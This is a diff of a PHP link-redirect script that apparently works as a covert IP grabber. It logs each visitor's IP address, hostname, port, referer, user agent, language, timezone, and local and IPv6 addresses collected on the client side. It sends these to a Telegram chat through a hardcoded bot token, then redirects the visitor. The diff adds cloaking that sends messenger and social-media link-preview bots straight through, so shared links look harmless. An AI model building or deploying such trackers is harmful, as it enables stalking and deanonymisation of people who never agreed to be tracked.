@@ -7,15 +7,22 @@ use UAParser\Parser;
 
 define('TOKEN', '615799996:AAHE-PXAcmLClqHUbnYmWqYByUj8MyEba5A', true);
 
-if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r")
-{	
 	$filename = trim( explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/");
 	$redirectid = trim(trim(file("./redirect/" . $filename . ".txt")[0]), '"');
-	if ($_SERVER ['HTTP_USER_AGENT'] == 'TelegramBot (like TwitterBot)' || $_SERVER ['HTTP_USER_AGENT'] == 'bitlybot/3.0 (+http://bit.ly/)' || $_SERVER ['HTTP_USER_AGENT'] == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.6.0 Chrome/45.0.2454.101 Safari/537.36 Viber") 
+	$array_agent = array( "TelegramBot (like TwitterBot)", "bitlybot", "WhatsApp", "facebookexternalhit"); 
+	if (in_array(explode('/', $_SERVER ['HTTP_USER_AGENT'], 2)[0], $array_agent) || 
+	end((explode(" ", $_SERVER ['HTTP_USER_AGENT']))) == 'Viber')
 	{
+		$file = fopen("./debug/log.txt", "a");
+		fwrite($file, "continue \n" . $_SERVER['HTTP_USER_AGENT']);
+		fwrite($file, "\n\n");
+		fclose($file);
 		header("Location: " . $redirectid);
+		exit();
 	}
-	else {
+
+	if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r" || substr($_SERVER['REQUEST_URI'], 0, 2) == "/w")
+	{
 		$data = "*" . date('l jS \of F Y h:i:s A') . "*" . "\n";
 		$data = $data . "*№* #" . $filename . "\n";
 		$remote = $_SERVER ['REMOTE_ADDR'];
@@ -23,7 +30,7 @@ if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r")
 		$data = $data . "*Source port:*\n\t" . $_SERVER ['REMOTE_PORT'] . "\n";
 		$data = $data . "*Referer:*\n\t" . $_SERVER ['HTTP_REFERER'] . "\n";
 		$data = $data . "*Redirect to:*\n\t" .  $redirectid . "\n";
-		$data = $data . "*User agent:*\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n";
+		$data = $data . "*User agent:*\n\t" . str_ireplace("_", "/", $_SERVER ['HTTP_USER_AGENT']) . "\n";
 		//--
 		$parser = Parser::create();
 		$result = $parser->parse($_SERVER ['HTTP_USER_AGENT']);
@@ -31,95 +38,98 @@ if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r")
 		if($result->device->family != 'Other'){$data = $data . "/" . $result->device->family  . "\n";} else{$data = $data ."\n";}
 		//--
 		$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
-		$chatid = trim(file("./redirect/" . $filename . ".txt")[1]);
-		$mess = $data;
-		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
+		$chatid = trim(file("./redirect/" . $filename . ".txt")[1]);		
+		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($data) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
 		header("Location: " . $redirectid);
+		exit();
 	}
-	exit();
-}
 
 
-if (count($_POST) > 0) {
-	$file = fopen("log.txt", "a");
-	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
-	$data = "*" . date('l jS \of F Y h:i:s A') . "*" . "\n";
-	$data = $data . "*№* #" . $_POST['reqUri'] . "\n";
-	$remote = $_SERVER ['REMOTE_ADDR'];
-	
-	fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
-	$data = $data . "*Connecting from:*\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n";
-	
-	fwrite($file, "Source port:\n\t" . $_SERVER ['REMOTE_PORT'] . "\n");
-	$data = $data . "*Source port:*\n\t" . $_SERVER ['REMOTE_PORT'] . "\n";
-	
-	fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
-	$data = $data . "*Referer:*\n\t" . $_SERVER ['HTTP_REFERER'] . "\n";
-	
-	fwrite($file, "Redirect to:\n\t" . $_POST['redirect'] . "\n");
-	$data = $data . "*Redirect to:*\n\t" .  $_POST['redirect'] . "\n";
-	
-	fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
-	$data = $data . "*User agent:*\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n";
-	//--
-	$parser = Parser::create();
-	$result = $parser->parse($_SERVER ['HTTP_USER_AGENT']);
-	fwrite($file, "User agent decoded:\n\t" . $result->toString() . "\n");
-	$data = $data . "*User agent decoded:*\n\t" . $result->toString();
-	if($result->device->family != 'Other'){$data = $data . "/" . $result->device->family  . "\n";} else{$data = $data ."\n";}
-	//--
-	fwrite($file, "Language:\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n");
-	$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
-	fwrite($file, "Timezone and Data (client side):\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . iconv('utf-8', 'windows-1251', $_POST["date"]) . "\n");
-	$data = $data . "*Timezone and Data (client side):*\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . $_POST["date"] ."\n";
-	fwrite($file, "Found addresses:\n");
-	$data = $data . "*Found addresses:*\n";
-	foreach ( $_POST as $ip ) {
-		if ($ip == $_POST['s1'] || $ip == $_POST['date'] || $ip == $_POST['ipv6'] || $ip == "none" || $ip == $_POST['chatid'] && count($_POST) > 1 || $ip == $_POST['redirect'] || $ip == $_POST['reqUri']) {
-			continue;
-		}
-		$ips = explode(",", $ip);
+	if (count($_POST) > 0) {
+		$file = fopen("log.txt", "a");
+		fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
+		$data = "*" . date('l jS \of F Y h:i:s A') . "*" . "\n";
+		$data = $data . "*№* #" . $_POST['reqUri'] . "\n";
+		$remote = $_SERVER ['REMOTE_ADDR'];
 		
-		foreach ( $ips as $address ) {
-			if (strlen($address) > 1) {
-				fwrite($file, "\t" . $address . " ");
-				$data = $data . "\t" . $address . " ";
-				fwrite($file, "(" . gethostbyaddr($address) . ")\n");
-				$data = $data . "(" . gethostbyaddr($address) . ")\n";
+		fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
+		$data = $data . "*Connecting from:*\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n";
+		
+		fwrite($file, "Source port:\n\t" . $_SERVER ['REMOTE_PORT'] . "\n");
+		$data = $data . "*Source port:*\n\t" . $_SERVER ['REMOTE_PORT'] . "\n";
+		
+		fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
+		$data = $data . "*Referer:*\n\t" . $_SERVER ['HTTP_REFERER'] . "\n";
+		
+		fwrite($file, "Redirect to:\n\t" . $_POST['redirect'] . "\n");
+		$data = $data . "*Redirect to:*\n\t" .  $_POST['redirect'] . "\n";
+		
+		fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
+		$data = $data . "*User agent:*\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n";
+		//--
+		$parser = Parser::create();
+		$result = $parser->parse($_SERVER ['HTTP_USER_AGENT']);
+		fwrite($file, "User agent decoded:\n\t" . $result->toString() . "\n");
+		$data = $data . "*User agent decoded:*\n\t" . $result->toString();
+		if($result->device->family != 'Other'){$data = $data . "/" . $result->device->family  . "\n";} else{$data = $data ."\n";}
+		//--
+		fwrite($file, "Language:\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n");
+		$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
+		fwrite($file, "Timezone and Data (client side):\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . iconv('utf-8', 'windows-1251', $_POST["date"]) . "\n");
+		$data = $data . "*Timezone and Data (client side):*\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . $_POST["date"] ."\n";
+		fwrite($file, "Found addresses:\n");
+		$data = $data . "*Found addresses:*\n";
+		foreach ( $_POST as $ip ) {
+			if ($ip == $_POST['s1'] || $ip == $_POST['date'] || $ip == $_POST['ipv6'] || $ip == "none" || $ip == $_POST['chatid'] && count($_POST) > 1 || $ip == $_POST['redirect'] || $ip == $_POST['reqUri']) {
+				continue;
+			}
+			$ips = explode(",", $ip);
+			
+			foreach ( $ips as $address ) {
+				if (strlen($address) > 1) {
+					fwrite($file, "\t" . $address . " ");
+					$data = $data . "\t" . $address . " ";
+					fwrite($file, "(" . gethostbyaddr($address) . ")\n");
+					$data = $data . "(" . gethostbyaddr($address) . ")\n";
+				}
 			}
 		}
+			
+		fwrite($file, "Web-proxy:");
+		$data = $data . "*Web-proxy:*";
+		if (isset($_POST['s1'])) {
+			$address = $_POST['s1'];
+			fwrite($file, "\n\t" . $address . " ");
+			$data = $data . "\n\t" . $address . " ";
+		}
+		fwrite($file, "\nIPv6:\n");
+		$data = $data . "\n*IPv6:*\n";
+		if ($_POST['ipv6'] != "none" ) {
+			fwrite($file, "\t" . $_POST['ipv6'] . " ");
+			$data = $data . "\t" . iconv('utf-8', 'windows-1251', $_POST['ipv6']) . " ";
+		}
+		fwrite($file, "\n\n\n\n");
+		fclose($file);
+		
+		if ($_POST['chatid'] != "none") {
+			$chatid = $_POST['chatid'];
+			$mess = $data;
+			$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
+		}
+		exit();
 	}
 		
-	fwrite($file, "Web-proxy:");
-	$data = $data . "*Web-proxy:*";
-	if (isset($_POST['s1'])) {
-	    $address = $_POST['s1'];
-	    fwrite($file, "\n\t" . $address . " ");
-		$data = $data . "\n\t" . $address . " ";
+	if (isset($_GET["redirect"])) {
+			$file = fopen("./redirect/redirect.txt", "w");
+			fwrite($file, '"' . htmlspecialchars($_GET["redirect"]) . '"' );
+			fclose($file);
+			exit();
 	}
-	fwrite($file, "\nIPv6:\n");
-	$data = $data . "\n*IPv6:*\n";
-	if ($_POST['ipv6'] != "none" ) {
-		fwrite($file, "\t" . $_POST['ipv6'] . " ");
-		$data = $data . "\t" . iconv('utf-8', 'windows-1251', $_POST['ipv6']) . " ";
-	}
-	fwrite($file, "\n\n\n\n");
-	fclose($file);
-	
-	if ($_POST['chatid'] != "none") {
-		$chatid = $_POST['chatid'];
-		$mess = $data;
-		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
-	}
-	exit();
-}
-	
-if (isset($_GET["redirect"])) {
-	    $file = fopen("./redirect/redirect.txt", "w");
-        fwrite($file, '"' . htmlspecialchars($_GET["redirect"]) . '"' );
-        fclose($file);
+
+	if (isset ($_GET["clear"])) {
+		unlink('log.txt');
 		exit();
-}
+	}
 
 
 
@@ -140,16 +150,27 @@ if (isset($_GET["redirect"])) {
 		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt')){
 			$filename = trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/");
 			$redirectid = trim(file("./redirect/" . $filename . ".txt")[0]);
-			echo '= ' . $redirectid . ";\n    var reqUri = \"" . $filename . "\";";
+			echo '= ' . $redirectid . ";\n";
+			//echo '= ' . $redirectid . ";\n    var reqUri = \"" . $filename . "\";";
 		}
 		else {
 			$lines = fopen('./redirect/redirect.txt', 'r');
 			echo "= " . fgets($lines) . ";\n";
 		}
 	?>
+	var reqUri <?php 
+		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt'))
+		{
+			echo "= \"" . $filename . "\";\n";
+		}
+		else
+		{
+			echo ";\n";
+		}
+		?>
 	var chatid <?php
 		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt')){
-			echo "=" . htmlspecialchars(trim(file("./redirect/" . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . ".txt")[1]));
+			echo "= " . htmlspecialchars(trim(file("./redirect/" . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . ".txt")[1])) . ";\n";
 			fclose($file);
 		}
 		else {
